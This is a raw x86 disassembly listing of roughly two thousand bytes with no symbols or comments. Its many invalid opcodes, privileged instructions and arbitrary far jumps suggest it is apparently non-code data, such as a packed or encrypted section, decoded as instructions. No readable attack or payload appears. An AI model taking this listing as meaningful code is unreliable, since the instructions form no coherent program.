  432ddd:	cdq    
  432dde:	jo     0x432e22
  432de0:	mov    bh,BYTE PTR [ebp-0x7c]
  432de3:	lock push eax
  432de5:	push   ds
  432de6:	lods   eax,DWORD PTR ds:[esi]
  432de7:	push   es
  432de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432de9:	bound  esi,QWORD PTR [edx]
  432deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432dec:	xchg   BYTE PTR [ebx-0x5e],al
  432def:	fsub   st(0),st
  432df1:	and    bl,BYTE PTR [eax+0xe]
  432df4:	cmp    DWORD PTR [edi+edx*8-0x7e],0x1e47aada
  432dfc:	mov    esp,0x80f74664
  432e01:	sti    
  432e02:	pop    DWORD PTR [eax]
  432e04:	mov    ah,0x45
  432e06:	mov    dh,0x5a
  432e08:	mov    eax,ds:0x4bdaa952
  432e0d:	popa   
  432e0e:	push   ecx
  432e0f:	gs mov dh,0x44
  432e12:	jp     0x432de0
  432e14:	fadd   DWORD PTR [ebx+0x5686c449]
  432e1a:	(bad)  
  432e1b:	or     eax,DWORD PTR [edx+0x72047461]
  432e21:	or     bl,bl
  432e23:	and    esi,ecx
  432e25:	inc    esi
  432e26:	push   ss
  432e27:	push   0x30
  432e29:	cmp    dh,BYTE PTR [ebp*2-0x3fd7344f]
  432e30:	pop    es
  432e31:	push   eax
  432e32:	pop    ss
  432e33:	and    DWORD PTR [eax-0x4d83dbf4],edi
  432e39:	icebp  
  432e3a:	hlt    
  432e3b:	sub    ecx,DWORD PTR [esi-0x1e]
  432e3e:	pop    ecx
  432e3f:	add    DWORD PTR [ebp+0x4d],edx
  432e42:	lahf   
  432e43:	clc    
  432e44:	fiadd  DWORD PTR [ecx+ecx*2+0x74]
  432e48:	cmp    edi,DWORD PTR [edx]
  432e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e4b:	pushf  
  432e4c:	mov    edi,0x8afe6889
  432e51:	xchg   esi,eax
  432e52:	out    dx,al
  432e53:	pop    edx
  432e54:	add    BYTE PTR ds:0xa53f0053,bh
  432e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432e5b:	cmp    al,0xb4
  432e5d:	rcr    DWORD PTR [esi],1
  432e5f:	sbb    bh,BYTE PTR [esi]
  432e61:	in     al,0xbe
  432e63:	cmp    al,BYTE PTR [eax-0x1c]
  432e66:	shr    BYTE PTR [ebx],cl
  432e68:	sub    bh,BYTE PTR [esi-0x3b5e0df4]
  432e6e:	mov    eax,0xa6e1b07c
  432e73:	mov    ds:0x32f0126b,al
  432e78:	cmp    BYTE PTR [eax-0x54],bh
  432e7b:	xchg   ecx,eax
  432e7c:	rol    BYTE PTR [edx+0x742c06ae],0xe4
  432e83:	xchg   edx,eax
  432e84:	mov    ds:0xe84e8127,al
  432e89:	mov    al,ds:0x20b5080b
  432e8e:	mov    eax,ds:0x74c74681
  432e93:	mov    bl,BYTE PTR [edx-0x24bf276a]
  432e99:	lock dec ebp
  432e9b:	or     al,0x7b
  432e9d:	mov    al,0xe5
  432e9f:	scas   eax,DWORD PTR es:[edi]
  432ea0:	out    dx,al
  432ea1:	into   
  432ea2:	lds    esp,FWORD PTR ds:0x3d964f8c
  432ea8:	int    0xaa
  432eaa:	dec    edi
  432eab:	lods   al,BYTE PTR ds:[esi]
  432eac:	test   eax,0x756d6058
  432eb1:	fidiv  WORD PTR [edi+ebx*4]
  432eb4:	mov    eax,0x1c072230
  432eb9:	scas   al,BYTE PTR es:[edi]
  432eba:	mov    ah,0x27
  432ebc:	push   0xffffff83
  432ebe:	cmp    BYTE PTR [ebp-0x70],al
  432ec1:	nop
  432ec2:	out    dx,eax
  432ec3:	hlt    
  432ec4:	fdiv   QWORD PTR [ebp+0x8]
  432ec7:	cmp    cl,BYTE PTR [eax+ebx*1]
  432eca:	mov    ds:0xcd080690,eax
  432ecf:	sub    ebx,DWORD PTR [edx]
  432ed1:	push   esi
  432ed2:	mov    ds:0xf32b06c,al
  432ed7:	call   0x7b4d2f2d
  432edc:	push   edi
  432edd:	mov    bl,BYTE PTR [esi+0x8]
  432ee0:	push   0xffffff88
  432ee2:	js     0x432ed6
  432ee4:	push   esp
  432ee5:	push   eax
  432ee6:	enter  0x5819,0x40
  432eea:	mov    ebx,0x2ed6a2b4
  432eef:	or     ecx,DWORD PTR [edi+0x43]
  432ef2:	adc    eax,0x4ab68682
  432ef7:	rcl    BYTE PTR [edx-0x102ebe86],0x81
  432efe:	out    0xd,al
  432f00:	cmp    al,0x54
  432f02:	add    al,ah
  432f04:	mov    ch,0x28
  432f06:	ins    DWORD PTR es:[edi],dx
  432f07:	push   es
  432f08:	jmp    0x432eaa
  432f0a:	xlat   BYTE PTR ds:[ebx]
  432f0b:	neg    BYTE PTR [eax+0x6c]
  432f0e:	dec    ebp
  432f0f:	xchg   esp,eax
  432f10:	aam    0x64
  432f12:	mov    edi,0xca777c6a
  432f17:	hlt    
  432f18:	sar    ah,0x4
  432f1b:	shl    DWORD PTR [esi-0x3],1
  432f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432f1f:	mov    ebx,0x72b6ff6a
  432f24:	sub    eax,0x213e8428
  432f29:	inc    edx
  432f2a:	jmp    0xa0b7:0x34563de6
  432f31:	jl     0x432eeb
  432f33:	inc    esi
  432f34:	cmp    dl,ah
  432f36:	push   ds
  432f37:	stos   DWORD PTR es:[edi],eax
  432f38:	or     BYTE PTR [ebp-0x71],cl
  432f3b:	test   BYTE PTR [esi-0x4281ad13],ch
  432f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432f42:	hlt    
  432f43:	dec    esi
  432f44:	adc    bl,BYTE PTR [eax-0xf7cfd00]
  432f4a:	or     eax,0xeb068d9f
  432f4f:	sub    BYTE PTR [edx+ebp*8],ah
  432f52:	push   esp
  432f53:	mov    eax,ds:0x663acbab
  432f58:	push   edi
  432f59:	or     ah,BYTE PTR [edx+0x70]
  432f5c:	or     BYTE PTR [ebp+0x28c1ad1d],ch
  432f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432f63:	ret    0xe241
  432f66:	in     eax,0xb4
  432f68:	iret   
  432f69:	add    BYTE PTR ds:0x83c05ae,cl
  432f6f:	xchg   ebx,eax
  432f70:	jp     0x432f34
  432f72:	clc    
  432f73:	mov    BYTE PTR [ecx+0x45],0xd7
  432f77:	inc    esi
  432f78:	sbb    cl,BYTE PTR [edx-0x5ec9ff48]
  432f7e:	in     al,dx
  432f7f:	and    eax,0x28328fa5
  432f84:	push   cs
  432f85:	add    al,0x6a
  432f87:	retf   
  432f88:	mov    al,ds:0xd5b1228a
  432f8d:	out    dx,al
  432f8e:	in     al,dx
  432f8f:	jo     0x432fe7
  432f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432f92:	loop   0x432f33
  432f94:	adc    cl,BYTE PTR [edx-0x5e43255c]
  432f9a:	out    0xdd,al
  432f9c:	loop   0x432f23
  432f9e:	add    DWORD PTR [ebp+0x44],0xd4be31b3
  432fa5:	dec    eax
  432fa6:	or     ecx,DWORD PTR [edx]
  432fa8:	mov    cs,WORD PTR [ecx]
  432faa:	push   esp
  432fab:	mov    ebx,0x21c6c50c
  432fb0:	rcr    al,1
  432fb2:	loope  0x432fc4
  432fb4:	or     al,BYTE PTR [edx+edx*8]
  432fb7:	dec    esi
  432fb8:	or     cl,al
  432fba:	ret    0x88b1
  432fbd:	fbld   TBYTE PTR [eax+0x7e8a8f4f]
  432fc3:	loope  0x432f77
  432fc5:	rcl    BYTE PTR [esp+edx*4-0x18],1
  432fc9:	mov    ebx,0x36cd4dc4
  432fce:	and    eax,0xa9f110bc
  432fd3:	mov    cs,WORD PTR [edx]
  432fd5:	fstp   TBYTE PTR [esi-0x1710c93c]
  432fdb:	mov    al,0x2d
  432fdd:	inc    esi
  432fde:	adc    dh,BYTE PTR [edx+0x3c]
  432fe1:	inc    esp
  432fe2:	leave  
  432fe3:	add    cl,dh
  432fe5:	cmp    ch,cl
  432fe7:	pusha  
  432fe8:	add    eax,0xce22cbc2
  432fed:	mov    BYTE PTR ds:0x5a92b08e,dh
  432ff3:	(bad)  
  432ff5:	stos   BYTE PTR es:[edi],al
  432ff6:	jecxz  0x432f8a
  432ff8:	cdq    
  432ff9:	pop    esi
  432ffa:	call   0x6d475e8f
  432fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433000:	sbb    al,dl
  433002:	test   eax,0x1639032
  433007:	sub    ebx,DWORD PTR [edx]
  433009:	es ss (bad) 
  43300c:	dec    ebp
  43300d:	add    al,0xfe
  43300f:	adc    esi,0x10d4b50c
  433015:	push   0xffffffd2
  433017:	cld    
  433018:	cli    
  433019:	stc    
  43301a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43301b:	out    0xed,al
  43301d:	xor    eax,0xc4779602
  433022:	push   cs
  433023:	add    dl,dh
  433025:	pusha  
  433026:	sub    al,0x14
  433028:	or     edx,eax
  43302a:	scas   al,BYTE PTR es:[edi]
  43302b:	pushw  cs
  43302d:	lods   al,BYTE PTR ds:[esi]
  43302e:	sbb    al,0xee
  433030:	mov    ecx,0x1cd4222b
  433035:	push   es
  433036:	sub    bh,dl
  433038:	stc    
  433039:	inc    edx
  43303a:	fcomp  QWORD PTR [eax]
  43303c:	pop    es
  43303d:	push   edx
  43303e:	adc    ebp,0xffffffdc
  433041:	or     ch,BYTE PTR [edx]
  433043:	loope  0x43307b
  433045:	and    al,0x72
  433047:	push   edx
  433048:	push   0x4c7f481d
  43304d:	imul   esi,DWORD PTR [edx-0x4f2fa7fe],0x36
  433054:	cmp    BYTE PTR [ebp+0x5b29b88a],dl
  43305a:	lds    esi,FWORD PTR [ebx+0x5902707e]
  433060:	(bad)  
  433061:	out    0x2e,al
  433063:	les    ecx,FWORD PTR [esi-0x252ebf24]
  433069:	add    ecx,DWORD PTR [edx-0x20]
  43306c:	(bad)  
  43306d:	xchg   ebx,eax
  43306e:	adc    BYTE PTR [esi+0x2e],bh
  433071:	mov    DWORD PTR [esi],0xe891859a
  433077:	cld    
  433078:	ins    DWORD PTR es:[edi],dx
  433079:	pop    esi
  43307a:	or     bl,al
  43307c:	or     al,0x1a
  43307e:	or     bl,BYTE PTR ds:0x26dadc01
  433084:	add    eax,0xba81eca5
  433089:	fild   QWORD PTR [ecx-0x60]
  43308c:	clc    
  43308d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43308e:	push   edi
  43308f:	xchg   edx,eax
  433090:	stos   BYTE PTR es:[edi],al
  433091:	in     al,dx
  433092:	jne    0x4330ee
  433094:	sub    DWORD PTR [eax*1+0x4c07c29d],ebx
  43309b:	fbld   TBYTE PTR [ebp+ebx*4+0x2c23db4]
  4330a2:	pop    eax
  4330a3:	pusha  
  4330a4:	dec    esp
  4330a5:	ins    BYTE PTR es:[edi],dx
  4330a6:	ja     0x43306e
  4330a8:	xor    bl,al
  4330aa:	and    ecx,DWORD PTR [eax+0x27fa50d5]
  4330b0:	(bad)  
  4330b1:	aaa    
  4330b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4330b3:	retf   0x7c64
  4330b6:	popa   
  4330b7:	mov    BYTE PTR ds:0x6c0c5d7e,cl
  4330bd:	dec    ebp
  4330be:	push   eax
  4330bf:	or     al,0x6c
  4330c1:	stos   BYTE PTR es:[edi],al
  4330c2:	pusha  
  4330c3:	sub    dl,al
  4330c5:	adc    BYTE PTR [ebp+edx*4-0x39],dl
  4330c9:	mov    ebx,0x4bfa691e
  4330ce:	sahf   
  4330cf:	ins    BYTE PTR es:[edi],dx
  4330d0:	and    al,0x0
  4330d2:	sbb    DWORD PTR [edx+0x1],eax
  4330d5:	lods   eax,DWORD PTR ds:[esi]
  4330d6:	add    DWORD PTR [esi-0x46],0x619405c0
  4330dd:	ret    
  4330de:	ss mov ch,0x67
  4330e1:	retf   0xe2f8
  4330e4:	xchg   esi,eax
  4330e5:	sub    BYTE PTR [edi],dl
  4330e7:	adc    DWORD PTR [edx+0x6b],edx
  4330ea:	mov    esp,0xd1c6b124
  4330ef:	mov    bh,0x70
  4330f1:	shr    DWORD PTR [ebx+0x58f00368],1
  4330f7:	shr    BYTE PTR [eax],1
  4330f9:	fnsave [edx-0x33bf60ef]
  4330ff:	xchg   esp,eax
  433100:	add    al,0x2d
  433103:	push   edx
  433104:	mov    dl,0x42
  433106:	imul   ecx,DWORD PTR [ebx],0x3a
  433109:	ss or  esp,0xb0465a87
  433110:	cs jne 0x433094
  433113:	mov    bl,0xf1
  433115:	or     ah,BYTE PTR [ebx+ebx*1+0x79b44066]
  43311c:	push   ecx
  43311d:	xchg   ebp,eax
  43311e:	fisubr WORD PTR [eax+0x2536aa]
  433124:	add    al,0xf3
  433126:	or     DWORD PTR [esi+0x2d],esi
  433129:	loope  0x4330ac
  43312b:	sbb    al,ch
  43312d:	sbb    BYTE PTR fs:[ebx],0x70
  433131:	or     BYTE PTR [edi-0x30],al
  433134:	adc    BYTE PTR [ebx+0x2a],0x79
  433138:	es jle 0x4330cc
  43313b:	imul   ebp,DWORD PTR [ebx-0x18],0x50
  43313f:	(bad)  
  433140:	test   al,0xa3
  433142:	(bad)  
  433143:	sahf   
  433144:	xchg   esp,eax
  433145:	sbb    ecx,esi
  433147:	xor    al,0x16
  433149:	fmul   DWORD PTR [edi+0x3e]
  43314c:	inc    edi
  43314d:	in     eax,dx
  43314e:	jbe    0x4331c2
  433150:	not    dl
  433152:	xchg   esi,eax
  433153:	push   ds
  433154:	test   eax,0x77a1ee8f
  433159:	enter  0x542c,0x34
  43315d:	xor    eax,0xc48c5a2b
  433162:	pop    eax
  433163:	test   al,0x22
  433165:	jg     0x4331bf
  433167:	ja     0x43318e
  433169:	xor    al,0xa9
  43316b:	inc    ebp
  43316c:	adc    BYTE PTR [edx-0x7ff8fa14],dh
  433172:	or     dl,BYTE PTR [esi+0x22]
  433175:	mov    al,0x24
  433177:	xor    cl,al
  433179:	pop    esi
  43317a:	jecxz  0x433111
  43317c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43317d:	(bad)  
  43317f:	jp     0x433194
  433181:	stos   BYTE PTR es:[edi],al
  433182:	sbb    BYTE PTR [esi+0x268f45b0],al
  433188:	push   edx
  433189:	jmp    0x282e:0xe2d49662
  433190:	adc    eax,0x84eb2c93
  433195:	hlt    
  433196:	add    esp,DWORD PTR [ecx+0xdb2de6d]
  43319c:	hlt    
  43319d:	add    ah,dh
  43319f:	out    0x30,al
  4331a1:	push   edx
  4331a2:	in     eax,dx
  4331a3:	mov    dl,0xc1
  4331a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331a6:	push   cs
  4331a7:	shl    DWORD PTR [ebp-0x7099cd3e],1
  4331ad:	mov    WORD PTR [eax],ss
  4331af:	adc    DWORD PTR ds:0xd874a602,ecx
  4331b5:	mov    WORD PTR [eax-0x5d],cs
  4331b8:	jne    0x4331ca
  4331ba:	cli    
  4331bb:	(bad)  
  4331bc:	fcomp  QWORD PTR [ebx]
  4331be:	pmuludq mm0,QWORD PTR [ebx]
  4331c1:	js     0x43319d
  4331c3:	lahf   
  4331c4:	inc    ebp
  4331c5:	cmp    BYTE PTR ds:0x511ad807,al
  4331cb:	mov    cl,0xca
  4331cd:	rol    BYTE PTR [ebx],1
  4331cf:	hlt    
  4331d0:	pop    esp
  4331d1:	inc    ecx
  4331d2:	scas   eax,DWORD PTR es:[edi]
  4331d3:	outs   dx,DWORD PTR ds:[esi]
  4331d4:	mov    edi,0x39056c2c
  4331d9:	sub    ecx,DWORD PTR [edi+edi*2-0x4d]
  4331dd:	jo     0x433216
  4331df:	add    BYTE PTR [esi+0x54],ch
  4331e2:	call   0x6aa9f430
  4331e7:	push   ss
  4331e8:	lods   al,BYTE PTR ds:[esi]
  4331e9:	imul   ecx,esi,0xffffffe3
  4331ec:	fild   DWORD PTR [ebx-0x3899d77]
  4331f2:	fdiv   DWORD PTR [edi-0x1e]
  4331f5:	out    0xad,eax
  4331f7:	mov    ch,0x89
  4331f9:	adc    ebp,DWORD PTR [bp-0x4fab]
  4331fe:	xor    ecx,0xffffff9a
  433201:	push   eax
  433202:	push   edi
  433203:	fdiv   QWORD PTR [edx-0x3d]
  433206:	lods   al,BYTE PTR ds:[esi]
  433207:	test   al,0x10
  433209:	pusha  
  43320a:	(bad)  [eax-0x3ba0a6ae]
  433210:	ins    BYTE PTR es:[edi],dx
  433211:	push   esi
  433212:	iret   
  433213:	test   BYTE PTR [esi-0x65],bl
  433216:	add    cl,BYTE PTR [ecx+0x36]
  433219:	cwde   
  43321a:	es hlt 
  43321c:	dec    eax
  43321d:	cli    
  43321e:	(bad)  
  43321f:	les    ebp,FWORD PTR [esi]
  433221:	sbb    eax,0xb602929d
  433226:	jmp    0x433248
  433228:	lock add BYTE PTR [edx-0x5c9519e4],ch
  43322f:	adc    dl,0x5b
  433232:	je     0x43323e
  433234:	icebp  
  433235:	mov    esp,0x14f2b200
  43323a:	pop    eax
  43323b:	push   eax
  43323c:	jo     0x4332ab
  43323e:	sbb    al,0x90
  433240:	int3   
  433241:	and    edi,DWORD PTR [esp+ebp*1]
  433244:	mov    dl,0x7
  433246:	xchg   esi,eax
  433247:	ds inc edx
  433249:	add    dh,BYTE PTR [ecx-0x6de1f52b]
  43324f:	pusha  
  433250:	test   DWORD PTR [eax],ebx
  433252:	call   0x2f8a:0x9c70c788
  433259:	dec    eax
  43325a:	sbb    eax,0xd36c4acc
  43325f:	mov    esi,0xf05b44d0
  433264:	sub    BYTE PTR [edi+0x0],0x40
  433268:	data16 int3 
  43326a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43326b:	dec    esp
  43326c:	sbb    ch,BYTE PTR [ecx-0x3d1c49fb]
  433272:	mov    dh,0xea
  433274:	pop    ebp
  433275:	jl     0x4332f3
  433277:	(bad)  
  433278:	cmp    cl,BYTE PTR [eax+0x2e20041b]
  43327e:	and    al,BYTE PTR [ecx+0x10]
  433281:	or     dh,ch
  433283:	call   0xa4af7ce
  433288:	dec    edx
  433289:	pusha  
  43328a:	jg     0x43324a
  43328c:	jo     0x433306
  43328e:	mov    al,0xf4
  433290:	rcr    DWORD PTR [esi-0x63],cl
  433293:	dec    ebp
  433294:	pop    edx
  433295:	jae    0x4332e3
  433297:	adc    BYTE PTR [edx-0x56],0x5e
  43329b:	fs mov al,0xd2
  43329e:	lea    ebp,[edi+0x18]
  4332a1:	sub    edx,DWORD PTR [esi+edx*1+0x346518ba]
  4332a8:	cdq    
  4332a9:	add    al,0xb8
  4332ab:	mov    dh,0x48
  4332ad:	(bad)  
  4332ae:	sar    BYTE PTR [edx+0x323476a4],0x11
  4332b5:	shl    BYTE PTR [ebx+eax*1],0xca
  4332b9:	adc    BYTE PTR [esi+ecx*1+0x84eac68],dl
  4332c0:	mov    dh,0x4
  4332c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332c3:	or     al,BYTE PTR [esp+eax*1+0x44]
  4332c7:	loop   0x43329b
  4332c9:	cmp    al,0xce
  4332cb:	inc    ebp
  4332cc:	int    0x4
  4332ce:	cmp    dl,BYTE PTR [ebp+ecx*2+0x30]
  4332d2:	loop   0x4332e2
  4332d4:	cs fcmovnbe st,st(0)
  4332d7:	and    ecx,DWORD PTR [ecx+0x14]
  4332da:	cmp    edx,DWORD PTR [ecx]
  4332dc:	test   al,0x50
  4332de:	push   edx
  4332df:	in     eax,dx
  4332e0:	add    bl,BYTE PTR [eax]
  4332e2:	mov    al,ds:0xb3eefaa7
  4332e7:	stos   BYTE PTR es:[edi],al
  4332e8:	add    al,0x5
  4332ea:	int    0x42
  4332ec:	repz test al,0xe5
  4332ef:	jb     0x43329f
  4332f1:	(bad)  
  4332f2:	sti    
  4332f3:	and    BYTE PTR [ebx+0x1],ah
  4332f6:	sub    BYTE PTR [ecx-0x7ac75f32],0xf4
  4332fd:	add    al,0xd3
  4332ff:	fiadd  DWORD PTR [esi]
  433301:	and    BYTE PTR [ebx+edi*1+0x4c],bl
  433305:	push   0xd8f6daac
  43330a:	push   edx
  43330b:	xor    esi,edi
  43330d:	pop    ecx
  43330e:	cmp    bl,BYTE PTR [eax]
  433310:	cli    
  433311:	pop    eax
  433312:	imul   edx,ebx,0x84448507
  433318:	div    esp
  43331a:	ret    0x568
  43331d:	xlat   BYTE PTR ds:[ebx]
  43331e:	(bad)  
  43331f:	imul   eax,esp,0x22
  433322:	lods   al,BYTE PTR ds:[esi]
  433323:	mov    ah,0xb3
  433325:	mov    ds:0xb0c3a91b,al
  43332a:	sbb    eax,0x1cede82a
  43332f:	mov    dh,0xe4
  433331:	shr    DWORD PTR [eax],0x7a
  433334:	sub    eax,0x9e89beb8
  433339:	test   al,0x2
  43333b:	ficom  WORD PTR [eax-0x4019df82]
  433341:	dec    esp
  433342:	sub    ch,BYTE PTR [esi+0x3f3aec4d]
  433348:	in     al,dx
  433349:	add    dh,BYTE PTR [ebx]
  43334b:	push   0x4
  43334d:	rcl    BYTE PTR [eax-0x55],0x9a
  433351:	sub    dl,ch
  433353:	shl    BYTE PTR [edx-0x56],0xca
  433357:	(bad)  
  433359:	add    eax,0x367e5605
  43335e:	pop    ebx
  43335f:	rol    BYTE PTR [eax],1
  433361:	dec    ecx
  433362:	adc    DWORD PTR [eax],eax
  433364:	xor    BYTE PTR [esi+0x42],dh
  433367:	add    dh,BYTE PTR [eax-0x65777de3]
  43336d:	xor    al,0xe7
  43336f:	xchg   esi,eax
  433370:	dec    esp
  433371:	scas   eax,DWORD PTR es:[edi]
  433372:	sub    BYTE PTR [eax+ebx*1+0x27301831],bh
  433379:	fwait
  43337a:	push   0x1b
  43337c:	push   edx
  43337d:	pop    ebx
  43337e:	aam    0x52
  433380:	inc    edi
  433381:	adc    al,0xd1
  433383:	sub    DWORD PTR [eax],edx
  433385:	xor    eax,0xf0b63d85
  43338a:	cmp    bh,ch
  43338c:	data16 sahf 
  43338e:	xchg   edi,eax
  43338f:	addr16 mov al,ds:0x508e
  433393:	js     0x4333e1
  433395:	bound  esp,QWORD PTR [ebx+0x46]
  433398:	ret    0x5dbf
  43339b:	sub    eax,ecx
  43339d:	inc    ecx
  43339e:	sbb    eax,0x24140224
  4333a3:	cmp    eax,0x3ae45420
  4333a8:	pop    edx
  4333a9:	or     ebp,DWORD PTR ds:0x8e02eae1
  4333af:	mov    dh,0xd5
  4333b1:	loop   0x433401
  4333b3:	and    ah,ah
  4333b5:	push   0xdc6492e8
  4333ba:	sbb    bh,BYTE PTR [ecx-0x5ed53ddc]
  4333c0:	rcr    DWORD PTR [esi-0x44],1
  4333c3:	pusha  
  4333c4:	push   esp
  4333c5:	sub    al,0x26
  4333c7:	pop    ecx
  4333c8:	push   edx
  4333c9:	jmp    0x4333e3
  4333cb:	cwde   
  4333cc:	xor    eax,0xac251e16
  4333d1:	xor    BYTE PTR [esi-0x7779d71e],bl
  4333d7:	imul   ebp,DWORD PTR [edx-0x80],0x2f960b35
  4333de:	lock nop
  4333e0:	dec    esp
  4333e1:	shl    BYTE PTR [ecx+esi*2-0x80],cl
  4333e5:	pop    esi
  4333e6:	dec    ebx
  4333e7:	out    dx,al
  4333e8:	jg     0x43343a
  4333ea:	add    BYTE PTR [ecx],ch
  4333ec:	in     eax,dx
  4333ed:	sub    BYTE PTR [edx],dl
  4333ef:	loopne 0x433443
  4333f1:	dec    di
  4333f3:	psrld  mm1,QWORD PTR [ebx+0x1]
  4333f7:	pop    ds
  4333f8:	add    bh,BYTE PTR [ecx+0x4b2d1095]
  4333fe:	fs cli 
  433400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433401:	pop    edi
  433402:	repnz fisttp WORD PTR [edx]
  433405:	cmp    ch,0x17
  433408:	inc    eax
  433409:	call   0x70c4:0x8c5682aa
  433410:	ror    DWORD PTR [eax-0x7],cl
  433413:	test   al,0xb9
  433415:	mov    ds:0x1b55002f,al
  43341a:	mov    dh,0xe
  43341c:	xchg   edi,eax
  43341d:	mov    ah,0x7a
  43341f:	lea    eax,ds:[edx-0x58]
  433423:	(bad)  [edi]
  433425:	stos   DWORD PTR es:[edi],eax
  433426:	fsubr  QWORD PTR [eax]
  433428:	mov    esi,esp
  43342a:	test   al,0x9
  43342c:	ins    DWORD PTR es:[edi],dx
  43342d:	cli    
  43342e:	xor    DWORD PTR [esi-0x6b],esi
  433431:	aas    
  433432:	add    BYTE PTR [ebp-0x5d30c0ae],ch
  433438:	inc    edi
  433439:	add    edi,DWORD PTR [edi+0x5ae972ae]
  43343f:	pop    ss
  433440:	push   esi
  433441:	inc    esp
  433442:	add    DWORD PTR [eax-0x3e],esi
  433445:	xchg   edi,eax
  433446:	sbb    eax,0x8a14d4
  43344b:	stos   DWORD PTR es:[edi],eax
  43344c:	lods   al,BYTE PTR ds:[esi]
  43344d:	dec    edx
  43344e:	jmp    0xf4c7:0x6ecc46a5
  433455:	pop    eax
  433456:	shl    BYTE PTR [edi],1
  433458:	loop   0x4334b9
  43345a:	stos   DWORD PTR es:[edi],eax
  43345b:	or     cl,BYTE PTR [edx+eax*1-0x5c2a9eb8]
  433462:	adc    ah,ah
  433464:	int3   
  433465:	sbb    DWORD PTR [ecx+0x7a107e10],ebp
  43346b:	les    edx,FWORD PTR [esi-0x7d]
  43346e:	mov    edx,0xb5e853f4
  433473:	mov    edi,es
  433475:	pop    esp
  433476:	pop    ebx
  433477:	bound  esp,QWORD PTR [edx+0x55586259]
  43347d:	jne    0x4334e7
  43347f:	sub    cl,BYTE PTR [eax+0x66]
  433482:	mov    ebx,0x247f037e
  433487:	push   ss
  433488:	loopne 0x433412
  43348a:	(bad)  
  43348b:	test   BYTE PTR [esi+0x6a6b87f0],0x2
  433492:	fbld   TBYTE PTR [edx+ecx*2-0x353c8308]
  433499:	scas   al,BYTE PTR es:[edi]
  43349a:	sub    DWORD PTR [ebp+0x4d],ebp
  43349d:	push   es
  43349e:	aad    0x82
  4334a0:	(bad)  
  4334a1:	mov    ecx,0x5497924e
  4334a6:	test   esp,edx
  4334a8:	mov    esi,0x820ae8f1
  4334ad:	push   ds
  4334ae:	call   0x6bd6:0x56b5013e
  4334b5:	push   ds
  4334b6:	cmp    eax,0xda10c1a6
  4334bb:	loope  0x43344d
  4334bd:	push   ds
  4334be:	scas   al,BYTE PTR es:[edi]
  4334bf:	je     0x433483
  4334c1:	ret    0x213a
  4334c4:	jge    0x43344a
  4334c6:	mov    esi,0x6928773e
  4334cb:	add    eax,0x7d540cd6
  4334d0:	cli    
  4334d1:	jb     0x433542
  4334d3:	mov    al,ds:0x400451e3
  4334d8:	mov    al,0xc
  4334da:	cmp    eax,0x5118b6e4
  4334df:	shr    edx,1
  4334e1:	xor    DWORD PTR [eax],ebx
  4334e3:	pop    eax
  4334e4:	jo     0x4334ad
  4334e6:	xchg   eax,edx
  4334e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4334e9:	fisub  DWORD PTR [ecx+0x35ead0a6]
  4334ef:	sbb    al,0xc6
  4334f1:	sub    ecx,edi
  4334f3:	and    al,0x36
  4334f5:	mov    ds:0x940ece21,eax
  4334fa:	push   esi
  4334fb:	retf   0x7a00
  4334fe:	ins    DWORD PTR es:[edi],dx
  4334ff:	cmp    al,0x88
  433501:	adc    BYTE PTR [esp+0x4d19f6e7],bh
  433508:	int    0x7e
  43350a:	ds mov ebx,0x891ca00b
  433510:	dec    esp
  433511:	cld    
  433512:	ins    BYTE PTR es:[edi],dx
  433513:	adc    al,0xb4
  433515:	add    bh,BYTE PTR [eax]
  433517:	dec    ecx
  433518:	call   0xdac1:0xd0afe4b8
  43351f:	cs adc dh,al
  433522:	sub    BYTE PTR [esi-0x4fd7b109],al
  433528:	dec    ebp
  433529:	xchg   ebp,eax
  43352a:	pushf  
  43352b:	jg     0x433515
  43352d:	rcr    DWORD PTR [ebp+0xa],cl
  433530:	scas   al,BYTE PTR es:[edi]
  433531:	pop    esp
  433532:	or     DWORD PTR [ecx-0x6c47525f],esp
  433538:	imul   ebx,DWORD PTR [edx-0x4b8679df],0x1e
  43353f:	or     bh,BYTE PTR [eax-0x24]
  433542:	add    ah,BYTE PTR [ebx]
  433544:	pop    edx
  433545:	adc    al,0xca
  433547:	xchg   edx,eax
  433549:	push   eax
  43354a:	cmp    ebp,esp
  43354c:	sub    BYTE PTR [edx-0x49],0xc0
  433550:	shr    BYTE PTR [edx],cl
  433552:	pushf  
  433553:	xchg   esp,eax
  433554:	popa   
  433555:	xor    al,0xcd
  433557:	cmp    BYTE PTR [esi+esi*2-0x41d607d2],bl
  43355e:	sub    ch,BYTE PTR [eax]
  433560:	ret    0x3c5c
  433563:	mov    ss,WORD PTR [eax]
  433565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433566:	add    BYTE PTR [edx],dh
  433568:	jg     0x4335d4
  43356a:	stos   DWORD PTR es:[edi],eax
  43356b:	stos   BYTE PTR es:[edi],al
  43356c:	push   edx
  43356d:	sti    
  43356e:	test   ah,cl
  433570:	sbb    BYTE PTR [edx+0x5f],0x40
  433574:	rol    al,1
  433576:	add    BYTE PTR [ebx+0x3b],bl
  433579:	call   0x673:0xb321c86
  433580:	stos   BYTE PTR es:[edi],al
  433581:	rcl    DWORD PTR [ecx-0x3d],cl
  433584:	daa    
  433585:	icebp  
  433586:	js     0x43352b
  433588:	lods   eax,DWORD PTR ds:[esi]
  433589:	and    ch,BYTE PTR [eax-0x78d3e844]
  43358f:	mov    BYTE PTR [ecx+0x41],dl
  433592:	lahf   
  433593:	pop    esp
  433594:	inc    eax
  433595:	adc    dh,BYTE PTR ds:[edi]
